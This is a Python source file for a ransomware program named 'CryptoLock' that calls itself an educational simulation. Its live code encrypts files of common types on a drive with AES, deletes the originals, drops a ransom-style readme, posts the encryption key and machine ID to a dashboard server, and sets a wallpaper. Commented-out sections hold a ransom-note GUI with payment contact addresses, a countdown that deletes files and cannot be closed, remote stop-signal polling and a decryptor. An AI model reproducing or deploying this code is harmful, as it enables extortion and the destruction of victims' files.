# Part 1: Initialization and Setup

import os
import sys
import requests
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import uuid
from datetime import datetime, timedelta
import time
import ctypes
import logging
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk

# Step 1: Utility function to get the resource path
def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

# Step 2: Ensure the time directory exists
def ensure_time_dir_exists():
    if not os.path.exists(TIME_DIR):
        os.makedirs(TIME_DIR)

# Step 3: Function to load the machine id
def load_machine_id():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        machine_id_path = os.path.join(drive, "Machine_id.txt")
        if os.path.exists(machine_id_path):
            try:
                with open(machine_id_path, 'r') as file:
                    machine_id = file.read().strip()
                    print(f"Machine ID loaded successfully from {machine_id_path}: {machine_id}")
                    return machine_id
            except FileNotFoundError:
                continue
    return None

# Global constants
TERMINATION_KEY = "bingo"
SECONDARY_TERMINATION_KEY = "stop"
HOME_DIR = os.path.expanduser('~')
TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank-you.png")

# Step 4: Ensure the time directory exists at the start
ensure_time_dir_exists()

# Encryption Configuration
DRIVES_TO_ENCRYPT = ['E:']
EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
DASHBOARD_URL = 'http://localhost'
MAX_ATTEMPTS = 10
DELAY = 5

# Step 5: Setup logging
logging.basicConfig(
    filename='encryption_log.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)

# Part 2: EncryptionTool Class Initialization and Key Generation

class EncryptionTool:
    # Step 6: Initialize the EncryptionTool class
    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.dashboard_url = dashboard_url
        self.max_attempts = max_attempts
        self.delay = delay
        self.key = self.generate_key(password)
        self.machine_id = str(uuid.uuid4())

    # Step 7: Function to generate the encryption key
    def generate_key(self, password):
        try:
            salt = get_random_bytes(16)
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
            logging.info("Key generated successfully.")
            return key
        except Exception as e:
            logging.error(f"Failed to generate key: {str(e)}")
            raise
# Part 3: File Encryption Functions
    # Step 8: Function to set the wallpaper
    def set_wallpaper(self, path):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            logging.info(f"Wallpaper set successfully to {path}.")
        except Exception as e:
            logging.error(f"Failed to set wallpaper: {str(e)}")

    # Step 9: Function to create important files
    def create_important_files(self, directory_path):
        try:
            d_data_path = os.path.join(directory_path, 'D-Data')
            os.makedirs(d_data_path, exist_ok=True)

            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
            file_contents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']

            for filename, content in zip(filenames, file_contents):
                file_path = os.path.join(d_data_path, filename)
                with open(file_path, 'w') as file:
                    file.write(content)

            logging.info(f"Created important files in '{d_data_path}'.")
        except Exception as e:
            logging.error(f"Failed to create important files: {str(e)}")

    # Step 10: Function to encrypt a single file
    def encrypt_file(self, file_path):
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            with open(file_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(file_path)
            logging.info(f"Encrypted {file_path}")
        except Exception as e:
            logging.error(f"Failed to encrypt {file_path}: {str(e)}")

    # Step 11: Function to encrypt all files in a directory
    def encrypt_files_in_directory(self, directory_path):
        try:
            for root, dirs, files in os.walk(directory_path):
                if '$RECYCLE.BIN' in root:
                    continue

                for file in files:
                    if any(file.endswith(ext) for ext in self.extensions):
                        file_path = os.path.join(root, file)
                        self.encrypt_file(file_path)
            logging.info(f"All files in {directory_path} encrypted successfully.")
        except Exception as e:
            logging.error(f"Failed to encrypt files in directory {directory_path}: {str(e)}")
# Part 4: User Manual Creation and Key Management

    # Step 12: Function to create a user manual
    def create_user_manual(self, directory_path):
        manual_content = f"""Dear User,
Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}.
Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
Thank you,
Your Security Team
"""
        manual_path = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
        try:
            with open(manual_path, "w") as manual_file:
                manual_file.write(manual_content)
            logging.info("User manual created successfully.")
        except Exception as e:
            logging.error(f"Failed to create user manual: {str(e)}")

    # Step 13: Function to send the encryption key to the dashboard
    def send_key_to_dashboard(self):
        encoded_key = base64.b64encode(self.key).decode('utf-8')
        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
        headers = {'Content-Type': 'application/json'}

        for attempt in range(self.max_attempts):
            logging.info(f"Attempt {attempt + 1} to send encryption key.")
            try:
                response = requests.post(self.dashboard_url, headers=headers, data=json.dumps(payload))
                if response.ok:
                    logging.info('Key sent successfully. Response OK.')
                    return True
                else:
                    logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
            except requests.exceptions.ConnectionError as e:
                logging.error(f"Connection error on attempt {attempt + 1}: {e}")
            if attempt < self.max_attempts - 1:
                time.sleep(self.delay)
        logging.error("All attempts to send the key failed.")
        return False

    # Step 13.1: Function to save the encryption key locally
    def save_key_locally(self):
        key_path = os.path.join('D:', 'encryption_key.txt')
        try:
            os.makedirs(os.path.dirname(key_path), exist_ok=True)
            with open(key_path, 'w') as file:
                file.write(f"Machine ID: {self.machine_id}\n")
                file.write(f"Encryption Key: {base64.b64encode(self.key).decode('utf-8')}\n")
            logging.info(f"Encryption key saved locally to {key_path}.")
            return True
        except Exception as e:
            logging.error(f"Failed to save encryption key locally: {str(e)}")
            return False
        
#     # Step 14: Function to save the machine ID
#     def save_machine_id(self, directory_path):
#         machine_id_path = os.path.join(directory_path, "Machine_id.txt")
#         try:
#             os.makedirs(directory_path, exist_ok=True)
#             with open(machine_id_path, 'w') as file:
#                 file.write(self.machine_id)
#             logging.info(f"Machine ID saved successfully to {machine_id_path}.")
#         except Exception as e:
#             logging.error(f"Failed to save Machine ID: {str(e)}")

#     # Step 15: Function to process a drive (create files, encrypt, etc.)
#     def process_drive(self, drive):
#         self.create_important_files(drive)
#         self.encrypt_files_in_directory(drive)
#         self.create_user_manual(drive)
#         self.save_machine_id(drive)

#     # Step 16: Execute the encryption process
#     def execute(self):
#         for drive in self.drives:
#             logging.info(f"Processing drive {drive}")
#             self.process_drive(drive)
#         if self.save_key_locally():
#             logging.info("Encryption key saved locally.")
#         else:
#             logging.error("Failed to save encryption key locally.")
#         if self.send_key_to_dashboard():
#             logging.info("Encryption key sent successfully.")
#         else:
#             logging.error("Failed to send encryption key.")
#         wallpaper_path = resource_path('img/wallpaper.png')
#         self.set_wallpaper(wallpaper_path)
#         logging.info("Encryption process completed.")
# # Part 5: Dialog Classes for User Interaction

# # Step 17: Define TerminationKeyDialog class for user interactions
# class TerminationKeyDialog(tk.Toplevel):
#     def __init__(self, parent, icon_path):
#         super().__init__(parent)
#         self.iconbitmap(icon_path)
#         self.title("Termination Key")
#         self.geometry("300x100")
#         self.result = None  # Initialize the result attribute
#         tk.Label(self, text="Enter the termination key to exit:").pack(pady=5)
#         self.key_entry = tk.Entry(self)
#         self.key_entry.pack(pady=5)
#         self.key_entry.focus_set()
#         tk.Button(self, text="Submit", command=self.on_submit).pack(pady=5)

#     def on_submit(self):
#         self.result = self.key_entry.get()
#         self.destroy()

# # Step 18: Define CustomSecondaryTerminationKeyDialog class for user interactions
# class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
#     def __init__(self, parent, icon_path, title, prompt):
#         self.icon_path = icon_path
#         self.prompt = prompt
#         super().__init__(parent, title)

#     # Step 19: Setup dialog UI
#     def body(self, master):
#         self.iconbitmap(self.icon_path)
#         tk.Label(master, text=self.prompt).pack(pady=5)
#         self.key_entry = tk.Entry(master)
#         self.key_entry.pack(pady=5)
#         return self.key_entry
    
#     def apply(self):
#         self.result = self.key_entry.get()

#     # Step 20: Center the dialog window
#     def center_window(self):
#         self.update_idletasks()
#         window_width = self.winfo_width()
#         window_height = self.winfo_height()
#         screen_width = self.winfo_screenwidth()
#         screen_height = self.winfo_screenheight()
#         position_right = int(screen_width / 2 - window_width / 2)
#         position_down = int(screen_height / 2 - window_height / 2)
#         self.geometry(f"+{position_right}+{position_down}")

# # Step 21: Define CountdownDialog class for countdown interactions
# class CountdownDialog(tk.Toplevel):
#     def __init__(self, parent, countdown_time, close_app_callback):
#         super().__init__(parent)
#         self.countdown_time = countdown_time
#         self.close_app_callback = close_app_callback
#         self.init_ui()
#         self.protocol("WM_DELETE_WINDOW", self.disable_event)
#         self.resizable(False, False)
#         self.attributes('-topmost', True)
#         self.overrideredirect(True)
#         self.grab_set()
#         self.center_window()

#     def disable_event(self):
#         pass

#     # Step 22: Setup countdown dialog UI
#     def init_ui(self):
#         self.geometry("350x150")
#         self.iconbitmap(ICON_PATH)
#         thanks_image = Image.open(THANKS_PATH).resize((50, 50))
#         thanks_photo = ImageTk.PhotoImage(thanks_image)
#         label = tk.Label(self, image=thanks_photo, bg='#f0f0f0')
#         label.image = thanks_photo
#         label.pack(side="left", padx=10, pady=20)
#         self.countdown_label = tk.Label(self, text=f"Application will close in {self.countdown_time} seconds.", bg='#f0f0f0')
#         self.countdown_label.pack(side="left", expand=True, padx=20, pady=20)
#         self.update_countdown()

#     # Step 23: Update countdown timer
#     def update_countdown(self):
#         if self.countdown_time > 0:
#             self.countdown_label.config(text=f"Application will close in {self.countdown_time} seconds.")
#             self.countdown_time -= 1
#             self.after(1000, self.update_countdown)
#         else:
#             self.countdown_label.config(text="Closing application now.")
#             self.close_app_callback()

#     # Step 24: Center the countdown dialog window
#     def center_window(self):
#         self.update_idletasks()
#         window_width = self.winfo_width()
#         window_height = self.winfo_height()
#         screen_width = self.winfo_screenwidth()
#         screen_height = self.winfo_screenheight()
#         position_right = int(screen_width / 2 - window_width / 2)
#         position_down = int(screen_height / 2 - window_height / 2)
#         self.geometry(f"+{position_right}+{position_down}")

# # Step 25: Define DeletionCountdownDialog class for deletion countdown interactions
# class DeletionCountdownDialog(tk.Toplevel):
#     def __init__(self, parent, stop_deletion_callback):
#         super().__init__(parent)
#         self.iconbitmap(ICON_PATH)
#         self.stop_deletion_callback = stop_deletion_callback
#         self.attributes('-topmost', True)
#         self.title("Deletion Countdown")
#         self.resizable(False, False)
        
#         window_width = 400
#         window_height = 200
#         screen_width = self.winfo_screenwidth()
#         screen_height = self.winfo_screenheight()
#         position_right = int(screen_width/2 - window_width/2)
#         position_down = int(screen_height/2 - window_height/2)
        
#         self.geometry(f"{window_width}x{window_height}+{position_right}+{position_down}")
        
#         self.protocol("WM_DELETE_WINDOW", self.on_try_close)
#         self.grab_set()
#         self.focus_force()
#         self.init_ui()

#     # Step 26: Setup deletion countdown dialog UI
#     def init_ui(self):
#         thanks_image = Image.open(THANKS_PATH).resize((80, 80))
#         thanks_photo = ImageTk.PhotoImage(thanks_image)
#         label_image = tk.Label(self, image=thanks_photo)
#         label_image.photo = thanks_photo
#         label_image.pack(pady=20)

#         self.label_countdown = tk.Label(self, text="Next file will be deleted in Every 10 seconds...", font=("Helvetica", 12))
#         self.label_countdown.pack()

#         button_stop = tk.Button(self, text="Enter Key", command=self.on_enter_key,
#                             font=('Helvetica', 10),
#                             relief=tk.FLAT)
#         button_stop.pack(pady=10, padx=10, ipadx=20, ipady=5)

#     def on_try_close(self):
#         messagebox.showwarning("Warning", "This window cannot be closed directly.")

#     # Step 27: Handle submission of the secondary termination key
#     def on_enter_key(self):
#         self.iconbitmap(ICON_PATH)
#         key = CustomSecondaryTerminationKeyDialog(self, ICON_PATH, "Stop Deletion", "Enter the secondary termination key:").result
#         if key == SECONDARY_TERMINATION_KEY:
#             self.stop_deletion_callback()
#             self.destroy()
#         else:
#             messagebox.showerror("Error", "Incorrect secondary termination key.")
# # Part 6: DecryptorApp Class and Initialization

# # Step 28: Setting up the main DecryptorApp class
# class DecryptorApp(tk.Tk):
#     def __init__(self):
#         super().__init__()
#         self.iconbitmap(ICON_PATH)
#         self.title("CryptoLock")
#         self.configure(bg='black')
#         self.geometry("900x800")
#         self.timer_update_id = None
#         self.stop_deletion = False
#         self.deletion_stopped = False
#         self.initialize_ui()
#         self.protocol("WM_DELETE_WINDOW", self.on_close_window)
#         self.stop_event = threading.Event()

#         self.machine_id = load_machine_id()
#         if self.machine_id:
#             self.load_timer_state()
#         else:
#             messagebox.showerror("Error", "No machine ID found. The application will exit.")
#             self.destroy()

#         threading.Thread(target=self.check_for_remote_stop_signal, args=(self.machine_id,), daemon=True).start()

#     # Step 29 : Function to check for remote stop signal
#     def check_for_remote_stop_signal(self, machine_id, check_interval=10):
#         url = f"http://localhost/cryptlock/includes/api/check_stop_signal.php?machine_id={machine_id}"
#         while not self.stop_deletion:
#             try:
#                 response = requests.get(url, timeout=10)
#                 response.raise_for_status()
#                 data = response.json()
#                 if data.get("stop_signal") == "1":
#                     self.stop_deletion_process_remotely()
#                     break
#             except requests.exceptions.RequestException as e:
#                 pass
#             time.sleep(check_interval)

#     # Step 29.1: Function to stop the deletion process remotely
#     def stop_deletion_process_remotely(self):
#         if not self.stop_deletion:
#             self.stop_deletion = True
#             self.deletion_stopped = True
#             self.stop_event.set()
#             self.log("Deletion process stopped by remote command.", 'blue')
#             if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
#                 self.deletion_dialog.destroy()
#                 self.deletion_dialog = None

#     # Step 30: Function to initialize the UI
#     def initialize_ui(self):
#         self.iconbitmap(ICON_PATH)
#         logo_image = Image.open(LOGO_PATH).resize((200, 200))
#         logo_photo = ImageTk.PhotoImage(logo_image)
#         frame = tk.Frame(self, bg='black')
#         frame.pack(pady=(20, 20))
#         logo_label = tk.Label(frame, image=logo_photo, bg='black')
#         logo_label.image = logo_photo
#         logo_label.pack(side=tk.LEFT, padx=(20, 10))

#         ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
#         | Attention: Your Files Are Encrypted | \n\n
#         This simulation is solely for educational purposes and must not be used maliciously.
#         Users are fully accountable for their actions.
#         Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n
#         ** To Recover Your Files:** \n
#         Ping Us at [ mykeys@cryptolock.xyz ]"""

#         ransom_note_label = tk.Text(frame, bg='black', font=('Helvetica', 12), wrap='word', height=16, width=60, borderwidth=0)
#         ransom_note_label.pack(side=tk.LEFT, padx=(10, 20))
#         ransom_note_label.insert(tk.END, " Proof of Concept: Ransomware Simulation \n", "center_red")
#         ransom_note_label.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_red")
#         ransom_note_label.insert(tk.END, "This simulation is solely for educational purposes and must not be used maliciously.\n", "center_green")
#         ransom_note_label.insert(tk.END, "Users are fully accountable for their actions.\n", "center_white")
#         ransom_note_label.insert(tk.END, "Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n", "center_white")
#         ransom_note_label.insert(tk.END, " ** To Recover Your Files:** \n", "center_yellow")
#         ransom_note_label.insert(tk.END, "Ping Us at [ doggu683@gmail.comcom ]\n", "center_yellow")
#         ransom_note_label.tag_configure("center", justify='center')
#         ransom_note_label.tag_configure("center_red", justify='center', foreground="red")
#         ransom_note_label.tag_configure("center_green", justify='center', foreground="green")
#         ransom_note_label.tag_configure("center_white", justify='center', foreground="white")
#         ransom_note_label.tag_configure("center_yellow", justify='center', foreground="yellow")
#         ransom_note_label.tag_add("center", "1.0", "1.end")
#         ransom_note_label.tag_add("center_red", "1.0", "2.end")
#         ransom_note_label.tag_add("center_green", "4.0", "4.end")
#         ransom_note_label.tag_add("center_white", "5.0", "6.end")
#         ransom_note_label.tag_add("center_yellow", "8.0", "9.end")
#         ransom_note_label.configure(state='disabled')

#         self.timer_label = tk.Label(self, text="", fg='red', bg='black', font=('Helvetica', 12))
#         self.timer_label.pack(pady=(10, 10))

#         self.setup_key_frame()
#         self.setup_log_frame()
#         self.setup_progress_frame()
# # Part 7: DecryptorApp Methods

#     # Step 31: Function to stop the deletion process
#     def stop_deletion_process(self):
#         if not self.stop_deletion:
#             self.stop_deletion = True
#             self.deletion_stopped = True
#             self.stop_event.set()
#             self.log("Deletion process stopped by secondary termination key.", 'white')
#             if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
#                 self.deletion_dialog.destroy()

#     # Step 32: Function to check the secondary termination key
#     def check_secondary_termination(self):
#         response = simpledialog.askstring("Stop Deletion", "Enter the secondary termination key:", parent=self)
#         if response == SECONDARY_TERMINATION_KEY:
#             self.stop_deletion_process()
#         else:
#             messagebox.showerror("Error", "Incorrect secondary termination key.")

#     # Step 33: Function to log messages
#     def log(self, message, color='green'):
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#         formatted_message = f"[{timestamp}] {message}"
#         if self.winfo_exists():
#             self.after(0, lambda: self._update_log_listbox(formatted_message, color))

#     # Step 34: Function to update the log listbox
#     def _update_log_listbox(self, message, color):
#         self.log_listbox.insert(tk.END, message)
#         self.log_listbox.itemconfig(tk.END, {'fg': color})
#         self.log_listbox.see(tk.END)

#     # Step 35: Setup the key frame
#     def setup_key_frame(self):
#         key_frame = tk.Frame(self, bg='black')
#         key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
#         self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
#         self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10, 0), ipady=8)
#         tk.Button(key_frame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica', 12),
#                 relief=tk.FLAT, command=self.start_decryption).pack(side=tk.RIGHT, padx=(10, 0))

#     # Step 36: Setup the log frame
#     def setup_log_frame(self):
#         log_frame = tk.Frame(self, bg='black')
#         log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

#         banner_text = "Welcome to CryptoLock - [HACKER MODE]"
#         banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
#         banner_label.pack(side=tk.TOP, fill=tk.X)

#         self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
#         self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

#         scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)
#         scrollbar.pack(side="right", fill="y")
#         self.log_listbox.config(yscrollcommand=scrollbar.set)

#     # Step 37: Setup the progress frame
#     def setup_progress_frame(self):
#         self.progress_frame = tk.Frame(self, bg='black')
#         self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
#         style = ttk.Style()
#         style.theme_use('clam')
#         style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
#         self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar",
#                                         orient=tk.HORIZONTAL, length=400, mode='determinate')
#         self.progress.pack(fill=tk.X, expand=True)
#         self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='white')
#         self.progress_label.pack()
# # Part 8: Decryption Process

#     # Step 38: Function to start the decryption process
#     def start_decryption(self):
#         decryption_key = self.key_entry.get()
#         if decryption_key:
#             try:
#                 key = base64.b64decode(decryption_key)
#                 self.log("Starting scan and decryption automatically.")
#                 if self.timer_update_id:
#                     self.after_cancel(self.timer_update_id)
#                     self.timer_update_id = None
#                 threading.Thread(target=self.scan_and_decrypt, args=(key,), daemon=True).start()
#             except base64.binascii.Error:
#                 messagebox.showerror("Error", "Invalid decryption key. Please check the key and try again.")
#         else:
#             messagebox.showerror("Error", "Decryption key is not provided.")

#     # Step 39: Function to scan and decrypt files
#     def scan_and_decrypt(self, key):
#         encrypted_files = []
#         drives = [f"{d}:\\" for d in "DEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]

#         for drive in drives:
#             self.log(f"Scanning drive {drive} for encrypted files.")
#             for dp, dn, filenames in os.walk(drive):
#                 if any(excluded in dp for excluded in {'System Volume Information', '$RECYCLE.BIN', 'Windows'}):
#                     continue
#                 for f in filenames:
#                     if f.endswith('.encrypted'):
#                         encrypted_files.append(os.path.join(dp, f))
#                         self.log(f"Found encrypted file: {os.path.join(dp, f)}")

#         total_files = len(encrypted_files)
#         self.safe_update_progress(0, total_files)
#         decrypted_count = 0
#         for file_path in encrypted_files:
#             if self.decrypt_file(file_path, key):
#                 decrypted_count += 1
#                 self.safe_update_progress(decrypted_count, total_files)

#         if decrypted_count == total_files:
#             self.after(0, self.stop_timer_and_show_success)
#         else:
#             self.after(0, lambda: messagebox.showerror("Decryption Failed","Failed to decrypt one or more files. Please check the decryption key and try again."))

#     # Step 40: Function to show incomplete decryption message
#     def show_incomplete_message(self, decrypted_count, total_files):
#         messagebox.showwarning("Decryption Incomplete", f"Decryption completed for {decrypted_count} out of {total_files} files.")

#     # Step 41: Function to safely update the progress bar
#     def safe_update_progress(self, value, maximum):
#         self.after(0, lambda: self.update_progress_bar(value, maximum))

#     # Step 42: Function to update the progress bar
#     def update_progress_bar(self, value, maximum):
#         self.progress["value"] = value
#         self.progress["maximum"] = maximum
#         percentage = 100 * (value / maximum) if maximum else 0
#         self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}%")

#     # Step 43: Function to stop the timer and show success message
#     def stop_timer_and_show_success(self):
#         if self.timer_update_id:
#             self.after_cancel(self.timer_update_id)
#             self.timer_update_id = None

#         success_message = "All files decrypted successfully. Thank you for your patience."
#         messagebox.showinfo("Decryption Complete", success_message, parent=self)

#         self.delete_timer_and_machine_id_files()
#         self.delete_timer_state_file()
#         countdown_dialog = CountdownDialog(self, 10, self.close_application)
#         countdown_dialog.mainloop()
